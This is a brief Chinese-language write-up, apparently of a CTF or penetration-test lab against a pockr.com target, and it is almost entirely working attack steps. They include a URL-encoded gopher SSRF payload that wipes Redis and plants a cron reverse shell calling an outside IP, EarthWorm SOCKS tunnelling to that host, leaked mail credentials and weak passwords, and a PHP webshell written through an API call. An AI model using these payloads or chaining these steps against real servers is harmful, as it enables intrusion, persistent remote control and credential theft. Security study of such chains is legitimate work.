ctrl+U 可以发现有路径直接写在了页面上 可以未授权访问
进入配置页面后 发现疑似文件包含 尝试了一下可以 包含了所有知道的文件
发现有一个redis的配置 配合api存活功能能ssrf打redis
```http
-- payload
gopher%3a%2f%2finner.redis.com%3a6379%2f_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/123.206.203.108/7591 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
data目录下有1.py 敏感信息
```
mail_host = "oa.pockr.com"  # 设置服务器
mail_port = 25
mail_user = "pockr"  # 用户名
mail_pass = "pockr"  # 口令
sender = 'test@pockr.org'
```
自己的服务器: ./ew -s rcsocks -l 1080 -e 8888
redis服务器: ./ew -s rssocks -d 123.206.203.108 -e 8888
浏览器代理访问 oa.pockr.com
账号密码弱口令 pockr pockr123
写shell
```
http://oa.pockr.com/index.php?m=api&f=getModel&moduleName=editor&methodName=save&params=filePath=../../www/aaa.php
fileContent=<?php $_POST[1]($_POST[2]);
```
